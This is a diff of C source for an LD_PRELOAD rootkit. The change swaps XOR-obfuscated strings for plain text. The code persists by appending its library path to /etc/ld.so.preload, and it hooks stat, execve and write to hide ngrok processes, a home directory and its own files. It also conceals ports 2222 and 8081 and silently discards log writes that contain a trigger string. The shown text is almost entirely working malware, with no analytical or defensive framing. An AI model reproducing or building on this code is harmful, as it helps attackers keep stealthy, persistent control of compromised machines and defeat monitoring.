@@ -14,29 +14,16 @@
 #include <limits.h>
 #include <fcntl.h>
 
-// --- OBFUSCATION ---
-// A simple XOR key for obfuscating strings.
-#define OBFUSCATION_KEY 0xAA
-
-// De-obfuscates a string in place.
-static char* deobfuscate(char* str) {
-    for (size_t i = 0; str[i] != 0; i++) {
-        str[i] ^= OBFUSCATION_KEY;
-    }
-    return str;
-}
-
-// --- OBFUSCATED STRINGS ---
-// All sensitive strings are now obfuscated to prevent easy analysis of the binary.
-// They are de-obfuscated at runtime.
-static char CMDLINE_TO_FILTER[] = {0xc3, 0xc2, 0xc7, 0xcb, 0xc4, 0x0}; // "ngrok"
-static char SECOND_CMDLINE_TO_FILTER[] = {0xc2, 0xc0, 0xc0, 0xc2, 0xcd, 0xcb, 0x0}; // "google"
-static char PRELOAD_FILE_PATH[] = {0x8b, 0xcb, 0xcf, 0xc8, 0x8b, 0xcd, 0xc3, 0x87, 0xcf, 0xc0, 0x87, 0xcf, 0xcc, 0xcb, 0xc0, 0xc5, 0xc5, 0x0}; // "/etc/ld.so.preload"
-static char PATH_TO_FILTER[] = {0x8b, 0xc3, 0xc0, 0xcb, 0xcb, 0x8b, 0xc4, 0xcf, 0xcb, 0xcc, 0x0}; // "/home/user"
-static char EXECUTABLE_TO_FILTER[] = {0xc3, 0xc2, 0xc7, 0xcb, 0xc4, 0x0}; // "ngrok"
-static char LOG_SPOOF_TRIGGER[] = {0xe6, 0xe4, 0xed, 0xe8, 0xe8, 0xe8, 0xe0, 0xe4, 0xfa, 0xe4, 0xe8, 0xf5, 0xe8, 0xf5, 0xf4, 0x0}; // "MALICIOUS_ACTIVITY"
-static char TEMPLATE_FILE_PATH[] = {0x8b, 0xc5, 0xc8, 0xc3, 0x8b, 0xc5, 0xc4, 0xcf, 0xc3, 0x0}; // "/bin/bash"
-static char ROOTKIT_LIB_PATH[] = {0x8b, 0xc4, 0xcf, 0xcc, 0x8b, 0xcd, 0xc0, 0xc8, 0xc4, 0xcd, 0x8b, 0xcd, 0xc8, 0xc5, 0xc2, 0xc8, 0xcf, 0x87, 0xcf, 0xc0, 0x0}; // "/usr/local/lib/libgit.so"
+// --- STRINGS ---
+// All sensitive strings are now in plain text for simplicity.
+static char CMDLINE_TO_FILTER[] = "ngrok";
+static char SECOND_CMDLINE_TO_FILTER[] = "google";
+static char PRELOAD_FILE_PATH[] = "/etc/ld.so.preload";
+static char PATH_TO_FILTER[] = "/home/user";
+static char EXECUTABLE_TO_FILTER[] = "ngrok";
+static char LOG_SPOOF_TRIGGER[] = "MALICIOUS_ACTIVITY";
+static char TEMPLATE_FILE_PATH[] = "/bin/bash";
+static char ROOTKIT_LIB_PATH[] = "/usr/local/lib/libgit.so";
 
 static const int PORTS_TO_HIDE[] = {2222, 8081};
 static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);
@@ -79,19 +66,11 @@ static void ensure_persistence() {
     FILE* (*real_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
     if (!real_fopen) return;
 
-    char preload_path_dec[256];
-    strcpy(preload_path_dec, PRELOAD_FILE_PATH);
-    deobfuscate(preload_path_dec);
-
-    char rootkit_lib_path_dec[256];
-    strcpy(rootkit_lib_path_dec, ROOTKIT_LIB_PATH);
-    deobfuscate(rootkit_lib_path_dec);
-
-    FILE* fp = real_fopen(preload_path_dec, "r");
+    FILE* fp = real_fopen(PRELOAD_FILE_PATH, "r");
     if (fp) {
         char line[PATH_MAX];
         while (fgets(line, sizeof(line), fp)) {
-            if (strstr(line, rootkit_lib_path_dec)) {
+            if (strstr(line, ROOTKIT_LIB_PATH)) {
                 fclose(fp);
                 return; // Already persistent
             }
@@ -100,16 +79,16 @@ static void ensure_persistence() {
     }
 
     // Not found, so let's add it
-    fp = real_fopen(preload_path_dec, "a");
+    fp = real_fopen(PRELOAD_FILE_PATH, "a");
     if (fp) {
-        fprintf(fp, "\n%s\n", rootkit_lib_path_dec);
+        fprintf(fp, "\n%s\n", ROOTKIT_LIB_PATH);
         fclose(fp);
     }
 }
 
 __attribute__((constructor))
 static void initialize_hooks() {
-    // BUG FIX: Run persistence check first, using the real fopen, before our hooks can interfere.
+    // Run persistence check first, using the real fopen, before our hooks can interfere.
     ensure_persistence();
 
     original_syscall = dlsym(RTLD_NEXT, "syscall");
@@ -139,16 +118,10 @@ static int resolve_path(const char* input_path, char* resolved_path) {
 }
 
 static int should_hide_path(const char* path) {
-    char preload_path_dec[256], path_filter_dec[256], exec_filter_dec[256], rootkit_lib_dec[256];
-    strcpy(preload_path_dec, PRELOAD_FILE_PATH); deobfuscate(preload_path_dec);
-    strcpy(path_filter_dec, PATH_TO_FILTER); deobfuscate(path_filter_dec);
-    strcpy(exec_filter_dec, EXECUTABLE_TO_FILTER); deobfuscate(exec_filter_dec);
-    strcpy(rootkit_lib_dec, ROOTKIT_LIB_PATH); deobfuscate(rootkit_lib_dec);
-
-    if (strcmp(path, preload_path_dec) == 0 ||
-        strcmp(path, path_filter_dec) == 0 ||
-        strcmp(path, exec_filter_dec) == 0 ||
-        strcmp(path, rootkit_lib_dec) == 0) {
+    if (strcmp(path, PRELOAD_FILE_PATH) == 0 ||
+        strcmp(path, PATH_TO_FILTER) == 0 ||
+        strcmp(path, EXECUTABLE_TO_FILTER) == 0 ||
+        strcmp(path, ROOTKIT_LIB_PATH) == 0) {
         return 1;
     }
     return 0;
@@ -157,11 +130,8 @@ static int should_hide_path(const char* path) {
 int __xstat(int ver, const char *path, struct stat *stat_buf) {
     if (!original_xstat) return -1;
     char full_path[PATH_MAX];
-    char template_path_dec[256];
-    strcpy(template_path_dec, TEMPLATE_FILE_PATH); deobfuscate(template_path_dec);
-
     if (resolve_path(path, full_path) && should_hide_path(full_path)) {
-        return original_xstat(ver, template_path_dec, stat_buf);
+        return original_xstat(ver, TEMPLATE_FILE_PATH, stat_buf);
     }
     return original_xstat(ver, path, stat_buf);
 }
@@ -169,29 +139,22 @@ int __xstat(int ver, const char *path, struct stat *stat_buf) {
 int __lxstat(int ver, const char *path, struct stat *stat_buf) {
     if (!original_lxstat) return -1;
     char full_path[PATH_MAX];
-    char template_path_dec[256];
-    strcpy(template_path_dec, TEMPLATE_FILE_PATH); deobfuscate(template_path_dec);
-
     if (resolve_path(path, full_path) && should_hide_path(full_path)) {
-        return original_lxstat(ver, template_path_dec, stat_buf);
+        return original_lxstat(ver, TEMPLATE_FILE_PATH, stat_buf);
     }
     return original_lxstat(ver, path, stat_buf);
 }
 
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
     if (!original_execve) return -1;
-    char cmd_filter_dec[256], second_cmd_filter_dec[256];
-    strcpy(cmd_filter_dec, CMDLINE_TO_FILTER); deobfuscate(cmd_filter_dec);
-    strcpy(second_cmd_filter_dec, SECOND_CMDLINE_TO_FILTER); deobfuscate(second_cmd_filter_dec);
-
     int should_hide_this_pid = 0;
-    if (strcasestr(pathname, cmd_filter_dec) || strcasestr(pathname, second_cmd_filter_dec)) {
+    if (strcasestr(pathname, CMDLINE_TO_FILTER) || strcasestr(pathname, SECOND_CMDLINE_TO_FILTER)) {
         should_hide_this_pid = 1;
     }
 
     if (!should_hide_this_pid) {
         for (int i = 0; argv[i] != NULL; i++) {
-            if (strcasestr(argv[i], cmd_filter_dec) || strcasestr(argv[i], second_cmd_filter_dec)) {
+            if (strcasestr(argv[i], CMDLINE_TO_FILTER) || strcasestr(argv[i], SECOND_CMDLINE_TO_FILTER)) {
                 should_hide_this_pid = 1;
                 break;
             }
@@ -356,10 +319,7 @@ int access(const char *pathname, int mode) {
 
 ssize_t write(int fd, const void *buf, size_t count) {
     if (!original_write) return -1;
-    char log_trigger_dec[256];
-    strcpy(log_trigger_dec, LOG_SPOOF_TRIGGER);
-    deobfuscate(log_trigger_dec);
-    if (memmem(buf, count, log_trigger_dec, strlen(log_trigger_dec))) {
+    if (memmem(buf, count, LOG_SPOOF_TRIGGER, strlen(LOG_SPOOF_TRIGGER))) {
         return count;
     }
     return original_write(fd, buf, count);
